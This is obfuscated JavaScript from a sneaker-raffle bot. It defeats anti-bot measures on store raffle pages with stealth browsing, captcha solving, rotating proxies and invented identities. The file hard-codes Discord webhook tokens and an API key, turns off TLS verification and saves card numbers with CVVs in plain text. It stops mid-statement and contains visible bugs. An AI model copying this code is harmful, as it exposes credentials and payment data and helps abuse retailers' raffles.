process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
var _0x27a360 = require('node-imap'), _0xcf7dfb = require('util')['inspect'];
const _0x5d77b8 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x42b48b } = require('discord.js');
var _0x139422 = require('exe');
const { execFile: _0x214ed7 } = require('child_process'), _0x198f78 = require('puppeteer-extra'), _0x3393bf = require('puppeteer-extra-plugin-recaptcha'), _0x538ad0 = require('puppeteer-extra-plugin-stealth'), _0x41d282 = require('chalk'), _0x219354 = require('node-bash-title'), _0x496729 = require('fs'), _0x5d8c90 = require('axios'), _0x290c0b = require('papaparse');
var _0x5769f4 = require('random-name');
const _0x45dd39 = require('request');
var _0x5208ba = require('prompt');
const _0x2b4f8d = _0x45dd39['jar']();
var _0x37a01c = {};
const _0x1071cc = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x122f3c = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x3aa0e1 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x3b1338 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x38570e = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x295220 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x1ddbe0 = 'https://discord.com/api/webhooks/', _0x1a9eb6 = '' + _0x1ddbe0 + _0x3aa0e1, _0x1cab4c = '' + _0x1ddbe0 + _0x3b1338, _0x152092 = '' + _0x1ddbe0 + _0x1071cc, _0x549818 = '' + _0x1ddbe0 + _0x122f3c, _0x136ee7 = '' + _0x1ddbe0 + _0x38570e, _0x2a57e7 = '' + _0x1ddbe0 + _0x295220;
const _0x3005fd = JSON['parse'](_0x496729['readFileSync']('../package.json', 'utf-8')), _0x3dc3b3 = _0x3005fd['version'];
var _0x4e44e9, _0xd50a79, _0x3cd4f2, _0x539c2e, _0x55c3a5, _0x50d201, _0x3da10f, _0x1b9488;
const _0x37d44e = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0xf0afdf = ![];
const _0x4a1c77 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x284b90 = '0123456789';
var _0x5b8a61 = _0x4a1c77['split']('');
const _0x56453a = require('auto-git-update'), { PageEmittedEvents: _0x392bec } = require('puppeteer'), { getRandomValues: _0x7a0c99 } = require('crypto'), { resolve: _0x248ff5 } = require('path'), { Console: _0x2596a9 } = require('console'), _0x365917 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x3e6b8a = new _0x56453a(_0x365917);
async function _0x1afc58() {
    _0x55c3a5 = _0x496729['readdirSync']('../proxies'), _0x539c2e = _0x496729['readdirSync']('../tasks'), !_0x496729['existsSync']('../accounts/fenom.csv') && _0x496729['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x496729['existsSync']('../accounts/bstn.csv') && _0x496729['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x496729['existsSync']('../failed-tasks.csv') && _0x496729['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x496729['existsSync']('../successful-tasks.csv') && _0x496729['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x37a01c = JSON['parse'](_0x496729['readFileSync']('../settings.json', 'utf-8')), !_0x37a01c['delay'] && (_0x37a01c['delay'] = 0x3c, _0x496729['writeFileSync']('../settings.json', JSON['stringify'](_0x37a01c, null, 0x2))), !_0x37a01c['masterMail'] && (_0x37a01c['masterMail'] = 'yourmail@gmail.com', _0x496729['writeFileSync']('../settings.json', JSON['stringify'](_0x37a01c, null, 0x2))), !_0x37a01c['masterPassword'] && (_0x37a01c['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x496729['writeFileSync']('../settings.json', JSON['stringify'](_0x37a01c, null, 0x2))), !_0x37a01c['captchaKey'] && (_0x37a01c['captchaKey'] = '', _0x496729['writeFileSync']('../settings.json', JSON['stringify'](_0x37a01c, null, 0x2))), !_0x37a01c['useRandomProxy'] && (_0x37a01c['useRandomProxy'] = !![], _0x496729['writeFileSync']('../settings.json', JSON['stringify'](_0x37a01c, null, 0x2))), !_0x37a01c['shuffleTasks'] && (_0x37a01c['useRandomProxy'] = ![], _0x496729['writeFileSync']('../settings.json', JSON['stringify'](_0x37a01c, null, 0x2))), !_0x37a01c['webhook'] && (_0x37a01c['webhook'] = '', _0x496729['writeFileSync']('../settings.json', JSON['stringify'](_0x37a01c, null, 0x2))), _0x37a01c['delay'] <= 0x1388 && (_0x37a01c['delay'] = _0x37a01c['delay'] * 0x3e8), _0x37a01c['AfewDelay'] && (delete _0x37a01c['AfewDelay'], _0x496729['writeFileSync']('../settings.json', JSON['stringify'](_0x37a01c, null, 0x2))), _0x37a01c['MahaDelay'] && (delete _0x37a01c['MahaDelay'], _0x496729['writeFileSync']('../settings.json', JSON['stringify'](_0x37a01c, null, 0x2))), _0x37a01c['footshopDelay'] && (delete _0x37a01c['footshopDelay'], _0x496729['writeFileSync']('../settings.json', JSON['stringify'](_0x37a01c, null, 0x2))), _0x37a01c['MahaDelay'] = _0x37a01c['delay'], _0x1ddbe0 = _0x37a01c['webhook'], _0x50d201 = _0x37a01c['licenseKey'];
}
let _0x10d44d, _0x5cb00f = [], _0x19642f;
const _0x1a79bd = _0x673e00 => new Promise(_0x32ff6b => setTimeout(_0x32ff6b, _0x673e00));
function _0x484ff7(_0x1ad416, _0x124bef) {
    return Math['floor'](Math['random']() * (_0x124bef - _0x1ad416 + 0x1) + _0x1ad416);
}
function _0x3726ab(_0x3acf16) {
    let _0x43e5a4 = _0x3acf16['length'], _0x53abc1;
    while (_0x43e5a4 != 0x0) {
        _0x53abc1 = Math['floor'](Math['random']() * _0x43e5a4), _0x43e5a4--, [_0x3acf16[_0x43e5a4], _0x3acf16[_0x53abc1]] = [
            _0x3acf16[_0x53abc1],
            _0x3acf16[_0x43e5a4]
        ];
    }
    return _0x3acf16;
}
async function _0x7358ae(_0x3a38c9) {
    return _0x5d8c90['get']('https://api.hyper.co/v4/licenses/' + _0x3a38c9, { 'headers': { 'Authorization': 'Bearer\x20' + _0x37d44e } })['then'](_0x3d864c => _0x3d864c['data'])['catch'](() => null);
}
;
async function _0x54357f(_0x1875f7) {
    console['clear']();
    if (_0x1875f7 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x2457c3 = await _0x5208ba['get']('License');
        if (_0x2457c3['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x1a79bd(0xbb8), _0x54357f(_0x1875f7);
        _0x1875f7 = _0x2457c3['License'], _0x37a01c['licenseKey'] = _0x1875f7, _0x50d201 = _0x1875f7, _0x496729['writeFileSync']('../settings.json', JSON['stringify'](_0x37a01c));
    }
    console['log']('Checking\x20license\x20' + _0x50d201 + '...'), await _0x1a79bd(0x320);
    const _0x389959 = await _0x7358ae(_0x1875f7);
    _0x3da10f = JSON['stringify'](_0x389959['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x1b9488 = JSON['stringify'](_0x389959['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x389959)
        return console['log']('License\x20not\x20found');
    if (!_0x389959['user'])
        return console['log']('License\x20not\x20bound');
    return _0x389959['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0xf0afdf = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0xf0afdf = ![]);
}
async function _0x4d99b0() {
    var _0x213daf = await _0x5208ba['get']('Module');
    return console['clear'](), _0x213daf['Module'];
}
;
async function _0x4fe842() {
    var _0x292e1c = await _0x5208ba['get']('Setting');
    return console['clear'](), _0x292e1c['Setting'];
}
async function _0x5b31d5() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x1e8895 = 0x0; _0x1e8895 < _0x539c2e['length']; _0x1e8895++) {
        console['log']('\x20(' + _0x1e8895 + ')\x20' + _0x539c2e[_0x1e8895]);
    }
    console['log']('');
    var _0x1a52f5 = await _0x5208ba['get']('Task');
    if (_0x1a52f5['Task'] > _0x539c2e['length'] - 0x1 || isNaN(_0x1a52f5['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x1a79bd(0x3e8), _0x5b31d5();
    var _0x41c135 = _0x496729['readFileSync']('../tasks/' + _0x539c2e[_0x1a52f5['Task']], 'utf-8');
    return _0x3cd4f2 = _0x290c0b['parse'](_0x41c135, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x41d282['blue'](_0x539c2e[_0x1a52f5['Task']])), _0x4e44e9 = _0x539c2e[_0x1a52f5['Task']], _0x3cd4f2;
}
async function _0x4f2028() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x103c44 = 0x0; _0x103c44 < _0x55c3a5['length']; _0x103c44++) {
        console['log']('\x20(' + _0x103c44 + ')\x20' + _0x55c3a5[_0x103c44]);
    }
    console['log']('');
    var _0x44d837 = await _0x5208ba['get']('Proxies');
    if (_0x44d837['Proxies'] > _0x55c3a5['length'] - 0x1 || isNaN(_0x44d837['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x1a79bd(0x3e8), _0x4f2028();
    var _0x4aac49 = _0x496729['readFileSync']('../proxies/' + _0x55c3a5[_0x44d837['Proxies']], 'utf-8')['split']('\x0a');
    let _0x218cc4 = _0x4aac49['map']((_0x365c17, _0x235769) => {
        sanatizeProxy = _0x365c17['replace']('\x0d', '');
        if (_0x4aac49[_0x235769 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0xd50a79 = _0x55c3a5[_0x44d837['Proxies']], console['clear'](), _0x218cc4;
}
async function _0x3b2656() {
    var _0x274282 = await _0x5208ba['get']('Value');
    return console['clear'](), _0x274282['Value'];
}
async function _0x18a2fd(_0x1c8e3e) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x2e66e3 = 0x0; _0x2e66e3 < _0x1c8e3e['length']; _0x2e66e3++) {
        console['log']('\x20(' + _0x2e66e3 + ')\x20[' + _0x1c8e3e[_0x2e66e3]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x74fe12 = await _0x5208ba['get']('Module');
    return _0x74fe12['Module'];
}
async function _0x1e77a0() {
    var _0x5e39b0 = await _0x5208ba['get']('Password');
    return console['clear'](), _0x5e39b0['Password'];
}
;
async function _0x22e95a() {
    var _0x404646 = await _0x5208ba['get']('Links');
    return _0x404646['Links'];
}
;
async function _0x4002ba() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x50fe7c = 0x0; _0x50fe7c < _0x5cb00f['length']; _0x50fe7c++) {
        console['log']('\x20(' + _0x50fe7c + ')\x20' + _0x5cb00f[_0x50fe7c]);
    }
    ;
    console['log']();
    let _0x42e9e6 = await _0x5208ba['get']('Product');
    return console['clear'](), _0x42e9e6['Product'];
}
;
function _0x223c9e() {
    var _0x57e78b = new Date(Date['now']())['toLocaleTimeString']();
    return _0x57e78b;
}
;
function _0x1e53aa() {
    var _0x4761f4 = new Date(Date['now']())['toLocaleString']();
    return _0x4761f4['replace'](',', '');
}
async function _0x21228b(_0x29f148, _0x8f33e0) {
    let _0x132606 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x3dc3b3 != 'devkey') {
        await _0x5d8c90['post'](_0x29f148, _0x8f33e0, _0x132606);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x550a27(_0x9faf44, _0x498775, _0x2c5507, _0x4af288, _0x21735f) {
    if (!_0x4af288 && _0x2c5507 == 'dev') {
        var _0xbc9d22 = new _0x42b48b()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x498775['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x498775['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x9faf44['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x37a01c['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x3da10f,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x9faf44['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x9faf44['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x3dc3b3,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0xbc9d22['data'];
    } else {
        if (_0x4af288 && _0x2c5507 == 'dev') {
            var _0xbc9d22 = new _0x42b48b()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x498775['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x3da10f,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x498775['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x9faf44['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x37a01c['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x21735f,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x9faf44['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x9faf44['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x3dc3b3,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0xbc9d22['data'];
        } else {
            if (_0x2c5507 == 'pub') {
                var _0xbc9d22 = new _0x42b48b()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x498775['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x498775['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x9faf44['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x37a01c['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x9faf44['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x3dc3b3,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0xbc9d22['data'];
            } else {
                if (_0x2c5507 == 'acc' && !_0x4af288) {
                    var _0xbc9d22 = new _0x42b48b()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x498775['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x3da10f,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x498775['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x37a01c['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x3dc3b3,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0xbc9d22['data'];
                } else {
                    if (_0x2c5507 == 'acc' && _0x4af288) {
                        var _0xbc9d22 = new _0x42b48b()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x498775['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x3da10f,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x21735f,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x498775['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x37a01c['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x3dc3b3,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0xbc9d22['data'];
                    } else {
                        if (_0x2c5507 == 'open') {
                            var _0xbc9d22 = new _0x42b48b()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x1b9488)['addFields']({
                                'name': 'User',
                                'value': '' + _0x3da10f,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x3dc3b3,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0xbc9d22['data'];
                        } else {
                            if (!_0x4af288 && _0x2c5507 == 'ver') {
                                var _0xbc9d22 = new _0x42b48b()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x498775['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x3da10f,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x498775['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x37a01c['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x3dc3b3,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0xbc9d22['data'];
                            } else {
                                if (_0x4af288 && _0x2c5507 == 'ver') {
                                    var _0xbc9d22 = new _0x42b48b()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x498775['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x3da10f,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x21735f,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x498775['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x37a01c['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x3dc3b3,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0xbc9d22['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x170817(_0x283be2, _0x460001) {
    var _0x271ca0 = _0x283be2[_0x460001]['Address1']['split'](''), _0x1034cb = _0x283be2[_0x460001]['Address2']['split'](''), _0x511fbd = _0x283be2[_0x460001]['Email']['split']('@');
    for (var _0x3383c8 = 0x0; _0x3383c8 < _0x271ca0['length']; _0x3383c8++) {
        if (_0x271ca0[_0x3383c8] == 'X') {
            var _0x4e6fda = Math['round'](Math['random']() * (_0x4a1c77['length'] - 0x1));
            _0x271ca0[_0x3383c8] = _0x5b8a61[_0x4e6fda];
        }
    }
    ;
    for (var _0x3383c8 = 0x0; _0x3383c8 < _0x1034cb['length']; _0x3383c8++) {
        if (_0x1034cb[_0x3383c8] == 'X') {
            var _0x4e6fda = Math['round'](Math['random']() * (_0x4a1c77['length'] - 0x1));
            _0x1034cb[_0x3383c8] = _0x5b8a61[_0x4e6fda];
        }
    }
    ;
    _0x283be2[_0x460001]['FirstName'] == 'RANDOM' && (_0x283be2[_0x460001]['FirstName'] = _0x5769f4['first']());
    _0x283be2[_0x460001]['LastName'] == 'RANDOM' && (_0x283be2[_0x460001]['LastName'] = _0x5769f4['last']());
    _0x511fbd[0x0] == 'RANDOM' ? _0x511fbd[0x0] = '' + _0x5769f4['first']() + _0x5769f4['last']() + _0x484ff7(0x1, 0x270f) + '@' : _0x511fbd[0x0] = _0x511fbd[0x0] + '@';
    _0x283be2[_0x460001]['Email'] = _0x511fbd['join'](''), _0x283be2[_0x460001]['Address1'] = _0x271ca0['join'](''), _0x283be2[_0x460001]['Address2'] = _0x1034cb['join']('');
    _0x283be2[_0x460001]['Phone'] == 'RANDOM' && (_0x283be2[_0x460001]['Phone'] = '0' + _0x484ff7(0x5f5e100, 0x3b9ac9ff));
    if (_0x283be2[_0x460001]['Follower'] == 'RANDOM') {
        var _0x15aaf9 = _0x484ff7(0x1, 0x270f);
        _0x283be2[_0x460001]['Follower'] = '' + _0x5769f4['first']() + _0x5769f4['last']() + _0x15aaf9 + '\x20';
    }
    _0x283be2[_0x460001]['HouseNumber'] == 'RANDOM' && (_0x283be2[_0x460001]['HouseNumber'] = _0x484ff7(0x1, 0xc8));
    if (_0x283be2[_0x460001]['Address1'] == 'RANDOM') {
        var _0x3bec8e = Math['round'](Math['random']() * (_0x4a1c77['length'] - 0x1)), _0x49ece0 = _0x5b8a61[_0x3bec8e];
        _0x283be2[_0x460001]['Address1'] = _0x5769f4['last']() + 'straat', _0x283be2[_0x460001]['Zip'] == '' && (_0x283be2[_0x460001]['Postcode'] = _0x484ff7(0x3e8, 0x270f) + '\x20' + _0x49ece0 + _0x49ece0, _0x283be2[_0x460001]['Zip'] = _0x283be2[_0x460001]['Postcode']), _0x283be2[_0x460001]['HouseNumber'] = '' + _0x484ff7(0x1, 0xc8);
    }
    return;
}
;
async function _0x2e4d36(_0x15a5ef, _0x15b357) {
    _0x496729['appendFileSync']('../failed-tasks.csv', _0x1e53aa() + ',' + _0x15b357['store'] + ',' + _0x15b357['name'] + ',' + _0x15a5ef['Url'] + ',' + _0x15a5ef['Size'] + ',' + _0x15a5ef['Follower'] + ',' + _0x15a5ef['FirstName'] + ',' + _0x15a5ef['LastName'] + ',' + _0x15a5ef['Address1'] + ',' + _0x15a5ef['Address2'] + ',' + _0x15a5ef['HouseNumber'] + ',' + _0x15a5ef['Zip'] + ',' + _0x15a5ef['City'] + ',' + _0x15a5ef['State'] + ',' + _0x15a5ef['Country'] + ',' + _0x15a5ef['Phone'] + ',' + _0x15a5ef['Email'] + ',' + _0x15a5ef['Password'] + ',' + _0x15a5ef['PaymentMethod'] + ',' + _0x15a5ef['CardType'] + ',' + _0x15a5ef['NameOnCard'] + ',' + _0x15a5ef['CardNumber'] + ',' + _0x15a5ef['ExpiryDate'] + ',' + _0x15a5ef['CVV'] + ',' + _0x15a5ef['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x4c6d06(_0x4b6a41, _0x4664b4) {
    _0x496729['appendFileSync']('../successful-tasks.csv', _0x1e53aa() + ',' + _0x4664b4['store'] + ',' + _0x4664b4['name'] + ',' + _0x4b6a41['Url'] + ',' + _0x4b6a41['Size'] + ',' + _0x4b6a41['Follower'] + ',' + _0x4b6a41['FirstName'] + ',' + _0x4b6a41['LastName'] + ',' + _0x4b6a41['Address1'] + ',' + _0x4b6a41['Address2'] + ',' + _0x4b6a41['HouseNumber'] + ',' + _0x4b6a41['Zip'] + ',' + _0x4b6a41['City'] + ',' + _0x4b6a41['State'] + ',' + _0x4b6a41['Country'] + ',' + _0x4b6a41['Phone'] + ',' + _0x4b6a41['Email'] + ',' + _0x4b6a41['Password'] + ',' + _0x4b6a41['PaymentMethod'] + ',' + _0x4b6a41['CardType'] + ',' + _0x4b6a41['NameOnCard'] + ',' + _0x4b6a41['CardNumber'] + ',' + _0x4b6a41['ExpiryDate'] + ',' + _0x4b6a41['CVV'] + ',' + _0x4b6a41['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x43cf40() {
    let _0x2cdc44 = proxyFile['split']('\x0a'), _0x4dadd5 = _0x2cdc44['map']((_0x2c80eb, _0x3c712a) => {
        sanatizeProxy = _0x2c80eb['replace']('\x0d', '');
        if (_0x2cdc44[_0x3c712a + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x4dadd5;
}
;
async function _0x4f871b(_0x57e22b) {
    var _0x523993 = _0x57e22b[0x1]['split'](':');
    const _0xe2c558 = await _0x198f78['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x523993[0x0] + ':' + _0x523993[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x190af9 = await _0xe2c558['newPage']();
        await _0x190af9['authenticate']({
            'username': '' + _0x523993[0x2],
            'password': '' + _0x523993[0x3]
        }), console['log'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x190af9['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x190af9['setRequestInterception'](!![]), _0x190af9['on']('request', _0x150a82 => {
            _0x150a82['resourceType']() === 'image' || _0x150a82['resourceType']() === 'font' || _0x150a82['resourceType']() === 'media' ? _0x150a82['abort']() : _0x150a82['continue']();
        }), await _0x190af9['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x190af9['waitForTimeout'](0xbb8), await _0x190af9['waitForSelector']('.product-card');
        const _0x3ead18 = await _0x190af9['$$eval']('a.product-card', _0x184ba1 => {
            return _0x184ba1['map'](_0x4a40b4 => _0x4a40b4['href']);
        });
        return _0x5cb00f = _0x3ead18;
    } catch (_0x17e595) {
        console['log']('\x20' + _0x17e595);
    } finally {
        _0xe2c558['close'](), console['clear']();
    }
}
;
async function _0x167cbf(_0x397c78, _0x5b4cc8) {
    _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x37a01c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1c1faf = 0x0; _0x1c1faf < bouncewear['length']; _0x1c1faf++) {
        await _0x170817(bouncewear, _0x1c1faf);
        if (bouncewear[_0x1c1faf]['Email'] == '' || bouncewear[_0x1c1faf]['Password'] == '' || bouncewear[_0x1c1faf]['FirstName'] == '' || bouncewear[_0x1c1faf]['LastName'] == '') {
            console['log'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x1c1faf + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x37a01c['useRandomProxy'] = ![])
